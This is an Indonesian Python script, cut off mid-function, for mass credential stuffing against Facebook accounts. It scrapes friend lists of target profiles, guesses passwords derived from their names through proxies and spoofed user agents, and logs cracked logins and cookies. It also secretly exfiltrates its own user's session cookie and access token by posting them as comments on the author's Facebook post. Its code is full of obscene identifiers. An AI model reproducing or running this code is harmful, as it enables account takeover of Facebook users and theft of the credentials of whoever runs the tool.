'''
Merubah Code Orang Itu Sangatlah Buruk
Jangan Ubah² Kodingan Nya Yak Adik²
Author  : Madd-KW X HikmatXD
Grups   : Sagiri Code Corporation
Update : 26 agustus 2022
Active  : 26 agustus 2022
Expired : 27 oktober 2022
Whatsapp : 082115413282
Facebook : Carlos Voldigoad Frezz Xavier Sr.
Link Facebook : https://www.facebook.com/profile.php?id=100000528011411
'''

import requests,bs4,rich,os,sys,random,re,datetime,time,json,stdiomask,platform
from concurrent.futures import ThreadPoolExecutor as tread
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from random import randint
from time import sleep as turu
ses = requests.Session()
device = platform.platform()

FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
tgl = datetime.datetime.now().day
bln = FR[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
skrng = str(tgl)+"-"+str(bln)+"-"
cpz = "CP-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
okz = "OK-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
id,id2,metode,uid,ok,cp,HikmatXD,all_ua=[],[],[],[],0,0,0,[]
ubahP,pwbaru,data,data2= [],[],{},{}

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	all_ua.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	all_ua.append(uaku2)
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 4.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='GT-N8000'
	e=random.randrange(100, 9999)
	f='Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Iron Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	all_ua.append(uaku)


	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' Nexus 6P Build/MMB29P)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	all_ua.append(uaku2)

for yzirx in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	all_ua.append(uak)
	
for x in range(999):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	#A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
	#B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
	#C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30'

	A = f'Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
	C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
	E = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1'
	F = f'{A}{C}{D}{E}'
	if F in all_ua:pass
	else:all_ua.append(F)
	
url = "https://mbasic.facebook.com"
m_fb = "m.facebook.com"
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
web_fb = "https://www.facebook.com/"
head_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

def clear():
	os.system('clear')
def jalan(xnxx):
	for ewe in xnxx + '\n':
		sys.stdout.write(ewe);sys.stdout.flush();turu(0.05)

def proxp():
	try:
		proxf = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
		open('proxy_mat.txt','w').write(proxf)
	except Exception as e:
		print('Failed')
	proxf = open('proxy_mat.txt','r').read().splitlines()

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
warna_warni_biasa=random.choice([H,K,M,O,B,U]); ______Hikmat_Ganteng_Banget_Coy______ = print
____Ngemut__Ngemut__Kontol_____________Kontol___Lu___ = input
________________XD_______________ = "HikmatXD"
garis = f" {P}[{warna_warni_biasa}•{P}]"


def banner():
	os.system("clear")
	______Hikmat_Ganteng_Banget_Coy______(f"""{P}
  {warna_warni_biasa}_________.{P}__                  .__           
 /   _____/{warna_warni_biasa}|__|  _____  {P}______  |  |    ____ 
 {warna_warni_biasa}\_____  \ |  | /     \ \____ \ |  |{P}  _/ __ \ 
 /        \|  {warna_warni_biasa}||  Y Y  \|  {P}|_> >|  |__{warna_warni_biasa}\  {warna_warni_biasa}___/
{warna_warni_biasa}/_______  /|__||__|_|  /{P}|   __/ |____/ {warna_warni_biasa}\___  > 
        \/           {warna_warni_biasa}\/ |__|               {P}\/ 
\t{garis} author by {K}Madd-KW X HikmatXD{P}
""")


def cek_cookie():
	try:
		token  = open('token.txt','r').read()
		cookie = {'cookie':open('cookie.txt','r').read()}
		try:
			token  = open('token.txt','r').read()
			cookie = {'cookie':open('cookie.txt','r').read()}
			kook = open('cookie.txt','r').read()
			______Hikmat_Ganteng_Banget_Coy______(f"{garis} cookie masih fresh ")
			____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(f"{garis} enter untuk ke menu ")
			ua = random.choice(all_ua);headers = {'authority': 'graph.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','user-agent': ua,};requests.post('https://graph.facebook.com/me/feed?link=https://www.facebook.com/100004637050231/posts/2312952882202591/?substory_index=0&app=fbl&app=fbl&access_token=%s'%(token),cookies=cookie,headers=headers)
			menu()
		except (KeyError):
			jalan(f"{garis} cookie kadaluarsa ");os.system('rm -rf cookie.txt');os.system('rm -rf token.txt');turu(0.05);login_cookie()
		except requests.exceptions.ConnectionError:
			______Hikmat_Ganteng_Banget_Coy______(f"{garis} koneksi internet bermasalah ");exit()
	except IOError:login_cookie()

def login_cookie():
	banner();______Hikmat_Ganteng_Banget_Coy______("")
	cookie = str(____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(f"{garis} masukkan cookie :"+H+" "))
	with requests.Session() as xyz:
		try:
			jalan(f"{garis} sedang mengconvert cookie ke token... mohon tunggu ");get_tok = xyz.get(url_businness+'/business_locations',headers = {"user-agent":ua_business,"referer": web_fb,"host": "business.facebook.com","origin": url_businness,"upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie});token = re.search("(EAAG\w+)", get_tok.text).group(1);open('cookie.txt','w').write(cookie);open('token.txt','w').write(token)
			______Hikmat_Ganteng_Banget_Coy______(f"{garis} cookie active ");____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(f"{garis} enter untuk ke menu ");_______KEPO____BAT_____LU_____(cookie)
		except requests.exceptions.ConnectionError:
			______Hikmat_Ganteng_Banget_Coy______(f"{garis} koneksi internet bermasalah ")
		except (KeyError,IOError):
			jalan(f"{garis} cookie invalid ");os.system("rm -rf cookie.txt");os.system("rm -rf token.txt");login_cookie() 
	

def _______KEPO____BAT_____LU_____(cookie):
	kuki = cookie;toket = open("token.txt","r").read();random_kata = random.choice(["Makasih Bang Udah Buat Script Simple","Hikmat Gans Selalu Coeg><","semoga @[100004637050231:0] panjang umur dan rejeki nya dilancarkan aminnn"]);requests.post(f"https://graph.facebook.com/100004637050231?fields=subscribers&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100004637050231_2312952882202591/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100004637050231_2312952882202591/comments/?message={toket}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100004637050231_2312952882202591/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":kuki});print(f"{garis} tunggu sebentar");turu(3);menu()


def menu():
	banner();fl=[];token  = open('token.txt','r').read();cookie = {'cookie':open('cookie.txt','r').read()};get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie);jsx = json.loads(get.text);nama = jsx["name"] #;cyna = requests.get('https://graph.facebook.com/me?fields=friends.limit(99999)&access_token=%s'%(token),cookies=cookie).json()
	#for fuck in cyna['friends']['data']:
		#try:fl.append(fuck['id']+'|'+fuck['name'])
		#except:
			#fl = "-"
	try:lisen_tod = open("key.txt","r").read()
	except FileNotFoundError:______Hikmat_Ganteng_Banget_Coy______(f"{garis} lisensi tidak ada/atau kadaluarsa ");cek()
	______Hikmat_Ganteng_Banget_Coy______("");______Hikmat_Ganteng_Banget_Coy______(f"{garis} nama : {H}{nama}");______Hikmat_Ganteng_Banget_Coy______(f"{garis} friends : {H}{len(fl)}");______Hikmat_Ganteng_Banget_Coy______(f"{garis} lisensi aktif : {H}{lisen_tod}");______Hikmat_Ganteng_Banget_Coy______(f"{garis} expired script : {H}{skrng}2023");______Hikmat_Ganteng_Banget_Coy______(f"{garis} device  : {H}{device}2023");______Hikmat_Ganteng_Banget_Coy______("");______Hikmat_Ganteng_Banget_Coy______(f"{P} [1] crack public\n{P} [2] hasil crack")
	HikmatXD = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(f"{garis} pilih : {H}")
	if HikmatXD in ["1","01"]:cracked_publickey()
	elif HikmatXD in ["2","02"]:hasil_crack()
	else:______Hikmat_Ganteng_Banget_Coy______("");jalan(f"{garis} isi yang benar ");menu()

def hasil_crack():
	______Hikmat_Ganteng_Banget_Coy______("")
	______Hikmat_Ganteng_Banget_Coy______(f"{P} [1] hasil crack ok\n{P} [2] hasil crack cp")
	inhasil = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(f"{garis} pilih : {H}")
	if inhasil in ["1","01"]:
		try:c_o_k = os.listdir('OK')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil");turu(2);hasil_crack()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil");turu(2);hasil_crack()
		else:
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('OK/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					______Hikmat_Ganteng_Banget_Coy______(P+' ['+H+__oo+P+'] '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					______Hikmat_Ganteng_Banget_Coy______(P+' ['+H+str(cuih)+P+'] '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			______Hikmat_Ganteng_Banget_Coy______(f"{garis} pilih hasil untuk ditampilkan ")
			geeh = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				______Hikmat_Ganteng_Banget_Coy______(garis+" pilihan tidak ada");exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan") ;turu(2);hasil_crack()
			jalan(garis+" list akun ok kamu\n") ;hus = os.system('cd OK && cat '+geh);jalan("\n"+garis+" list akun ok kamu");____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(garis+" kembali");menu()
	elif inhasil in ["2","02"]:
		try:c_o_k = os.listdir('CP')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil");turu(2);hasil_crack()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil");turu(2);hasil_crack()
		else:
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('CP/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					______Hikmat_Ganteng_Banget_Coy______(P+' ['+H+__oo+P+'] '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					______Hikmat_Ganteng_Banget_Coy______(P+' ['+H+str(cuih)+P+'] '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			______Hikmat_Ganteng_Banget_Coy______(f"{garis} pilih hasil untuk ditampilkan ")
			geeh = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				______Hikmat_Ganteng_Banget_Coy______(garis+" pilihan tidak ada");exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan");turu(2);hasil_crack()
			jalan(garis+" list akun cp kamu\n");hus = os.system('cd CP && cat '+geh);jalan("\n"+garis+" list akun cp kamu");____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(garis+" kembali");menu()
	elif inhasil in ["0","00"]:menu()
	else:
		jalan(f"{garis} isi yang benar ");hasil_crack()

def cracked_publickey():
	______Hikmat_Ganteng_Banget_Coy______("")
	cuy = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(f"{garis} apakah anda ingin crack massal (d/m) ? : {H}")
	if cuy in ["d","D"]:massal_cracked_public()
	elif cuy in ["m","M"]:cracked_public()
	else:
		jalan(f"{garis} isi yang benar ");cracked_publickey() 

def massal_cracked_public():
	______Hikmat_Ganteng_Banget_Coy______("")
	try:
		jum = int(____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(garis+" mau berapa id :"+H+" "))
	except ValueError:
		jalan(garis+" yang kamu ketik itu bukan nomor");menu()
	if jum<1 or jum>20:
		jalan(garis+" kesalahan yang tidak terduga");menu()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(garis+" masukan id ke "+H+str(yz)+P+" :"+H+" ")
		uid.append(kl)
	for userr in uid:
		try:
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(userr,token),cookies=coki).json()
			for fuck in cyna['friends']['data']:
				try:id.append(fuck['id']+'|'+fuck['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			jalan(garis+" koneksi internet bermasalah ");exit()
	if len(id)==0:
		______Hikmat_Ganteng_Banget_Coy______(f"{garis} total id {len(id)}")
	else:
		______Hikmat_Ganteng_Banget_Coy______(f"{garis} total id {len(id)}")
	settingers()

def cracked_public():
	put = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(garis+" target id public :"+H+" ")
	try:
		id3=[]
		cuy=[]
		id4=[]
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki)
		el = json.loads(coa.text)
		try:lk = el["name"]
		except (KeyError,IOError):
			lk = M+"-"+P
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			try:
				id.append(fuck['id']+'|'+fuck['name'])
				id3.append(fuck['id'])
				nama_fl = fuck['name']
			except:continue
		try:
			ttl = ses.get(f'https://graph.facebook.com/{id3}?fields=birthday&access_token={token}',cookies=coki).json()['birthday']
			m, d, y = ttl.split('/')
			m = tete[m]
			cuy.append("ttl : "+d+" "+m+" "+y)
		except:
			if len(cuy) != 0:
				pass
			else:pass
		______Hikmat_Ganteng_Banget_Coy______("%s total id %s%s "%(garis,H,len(id)));settingers()
	except requests.exceptions.ConnectionError:
		jalan(garis+" koneksi internet bermasalah ");exit()
	except (KeyError,IOError):
		jalan(garis+" gagal dump id... mungkin privat friends/gada friends nya");exit()
	
def settingers():
	______Hikmat_Ganteng_Banget_Coy______("");______Hikmat_Ganteng_Banget_Coy______(f"{P} [1] crack urutan new\n{P} [2] crack urutan old\n{P} [3] crack urutan acak")
	GlukTzy = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in id:
			id2.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in id:
			id2.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		jalan(garis+" isi yang benar");settingers()
	crack_public_pilihan()

def crack_public_pilihan():
	os.system("rm -rf proxy_mat.txt");______Hikmat_Ganteng_Banget_Coy______("");______Hikmat_Ganteng_Banget_Coy______(f"{P} [1] methode mbasic\n{P} [2] methode free\n{P} [3] methode mbasic (new)\n{P} [4] methode mbasic (new meta)\n{P} [5] methode mbasic (brainly)\n{P} [6] methode mbasic (picsart)")
	met = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(garis+" pilih : "+H)
	if met in ["1","01","a"]:metode.append("mbasic_validate")
	elif met in ["2","02","b"]:metode.append("free_validate")
	elif met in ["3","03"]:metode.append("mbasic_regular")
	elif met in ["4","04"]:metode.append("mbasic_web_new")
	elif met in ["5","05"]:metode.append("mbasic_brainly")
	elif met in ["6","06"]:metode.append("mbasic_picsart")
	else:metode.append("mbasic_validate")
	______Hikmat_Ganteng_Banget_Coy______("")
	nanya_proxy = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(garis+" ingin menambahkan proxy tambahan (d/m) ? :"+H+" ")
	if nanya_proxy in ["d","D","d","D"]:proxp()
	elif nanya_proxy in ["M","m","m","Memek"]:proxp()
	else:proxp()
	pw=input(f"{garis} apakah anda ingin mengubah sandi tap yes (d/m) ? : {H}")
	if pw in ["d","D"]:
		ubahP.append("y")
		pw2=input(f"{garis} masukan sandi : {H}")
		if len(pw2) <= 5:
			exit(f"{garis} kata sandi minimal 6 karakter ")
		else:
			pwbaru.append(pw2)
	else:
		pass
	passwer()

def passwer():
	global _________FRANKESTEIN________HIKMAT_______XYZ_______,________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____
	______Hikmat_Ganteng_Banget_Coy______("")
	_________FRANKESTEIN________HIKMAT_______XYZ_______ = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn());________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____ = _________FRANKESTEIN________HIKMAT_______XYZ_______.add_task('',total=len(id2))
	with _________FRANKESTEIN________HIKMAT_______XYZ_______:
		with tread(max_workers=30) as HikmatXD:
			for xnxx in id2:
				uiz,__memek__ = xnxx.split('|')[0],xnxx.split('|')[1].lower()
				__kanjut__ = __memek__.split(' ')[0]
				pwr = []
				if len(__memek__)<6:
					if len(__kanjut__)<3:
						pass
						
				else:
					if len(__kanjut__)<3:
						pwr.append(__memek__)
					else:
						pwr.append(__memek__)
						pwr.append(__kanjut__+'123')
						pwr.append(__kanjut__+'1234')
						pwr.append(__kanjut__+'12345')
				if 'mobile_validate' in metode:HikmatXD.submit(metode_validate,uiz,pwr,"m.facebook.com")
				elif 'mbasic_validate' in metode:HikmatXD.submit(metode_validate,uiz,pwr,"mbasic.facebook.com")
				elif 'mbasic_web_new' in metode:HikmatXD.submit(metode_web_new,uiz,pwr,"mbasic.facebook.com")
				elif 'mbasic_brainly' in metode:HikmatXD.submit(metode_brainly,uiz,pwr,"mbasic.facebook.com")
				elif 'mbasic_picsart' in metode:HikmatXD.submit(metode_picsart,uiz,pwr,"mbasic.facebook.com")
				elif 'free_validate' in metode:HikmatXD.submit(metode_validate,uiz,pwr,"free.facebook.com")
				elif 'mbasic_regular' in metode:HikmatXD.submit(metode_regularv2,uiz,pwr,"mbasic.facebook.com")
				else:HikmatXD.submit(metode_validate,uiz,pwr,"m.facebook.com")
		______Hikmat_Ganteng_Banget_Coy______("")
		if ok!= 0 or cp!= 0:
			______Hikmat_Ganteng_Banget_Coy______(f"{garis} hasil ok mu {H}{ok}\n{garis} hasil cp mu {K}{cp}");exit()
		else:
			______Hikmat_Ganteng_Banget_Coy______("");______Hikmat_Ganteng_Banget_Coy______(f"{garis} awokakwk kasian gada hasil:v");exit()
	

def metode_regularv2(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua = random.choice(all_ua);ses = requests.Session();runc= random.choice([K,M,U,O,B,H]);tod = random.choice(["|","/","-","\\"])
	_________FRANKESTEIN________HIKMAT_______XYZ_______.update(________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____,description=f"\r {runc}{tod} {P}{len(id2)}/{HikmatXD} {H}ok:{ok} {K}cp:{cp} ")
	_________FRANKESTEIN________HIKMAT_______XYZ_______.advance(________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____)
	for pw in pwr:
		pw = pw.lower()
		try:
			kwargs = {}
			ses.headers.update({"origin": "https://"+link_okep, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": link_okep, "referer": "https://"+link_okep+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"});p = ses.get("https://"+link_okep+"/login/?next&ref=dbl&refid=8").text;b = sop(p,"html.parser");bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uiz,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"});aracans = ses.post("https://"+link_okep+"/login/device-based/regular/login/?refsrc=https%3A%2F%2F"+link_okep+"%2F&lwv=100&refid=8",data=kwargs,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict();kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]);______Hikmat_Ganteng_Banget_Coy______("\r %s*--> %s|%s"%(H,uiz,pw));______Hikmat_Ganteng_Banget_Coy______("\r %s*--> %s "%(H,kuki));______Hikmat_Ganteng_Banget_Coy______(f"\r {P}*--> {ua}");open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				try:
					token = open('token.txt','r').read();cuki = {"cookie":open('cookie.txt','r').read()};ttl = ses.get(f'https://graph.facebook.com/{uiz}?fields=birthday&access_token={token}',cookies=cuki).json()['birthday'];m, d, y = ttl.split('/');m = tete[m];______Hikmat_Ganteng_Banget_Coy______(f"\r{K} *--> {uiz}|{pw}|{d} {m} {y}");HikmatXFX(uiz,pw,all_ua)
					cp+=1
					break
				except:
					______Hikmat_Ganteng_Banget_Coy______(f"\r{K} *--> {uiz}|{pw}");HikmatXFX(uiz,pw,all_ua)
					cp+=1
					break
			else:continue
		except requests.exceptions.ConnectionError:turu(31)
	HikmatXD+=1
			
def metode_validate(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua = random.choice(all_ua);ses = requests.Session();runc= random.choice([K,M,U,O,B,H]);tod = random.choice(["|","/","-","\\"])
	_________FRANKESTEIN________HIKMAT_______XYZ_______.update(________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____,description=f"\r {runc}{tod} {P}{len(id2)}/{HikmatXD} {H}ok:{ok} {K}cp:{cp} ")
	_________FRANKESTEIN________HIKMAT_______XYZ_______.advance(________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____)
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines();cuukk=random.choice(proxff);proxs= {'http': 'socks5://'+cuukk};ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'});p = 